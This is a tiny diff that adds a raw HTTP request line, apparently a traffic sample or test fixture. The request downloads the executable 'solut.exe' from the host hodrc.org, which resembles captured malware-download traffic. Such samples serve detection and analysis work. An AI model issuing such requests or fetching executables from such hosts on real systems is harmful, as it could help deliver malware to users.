@@ -1,0 +1,4 @@
+GET /ot/solut.exe HTTP/1.1
+Host: hodrc.org
+Connection: Keep-Alive
+
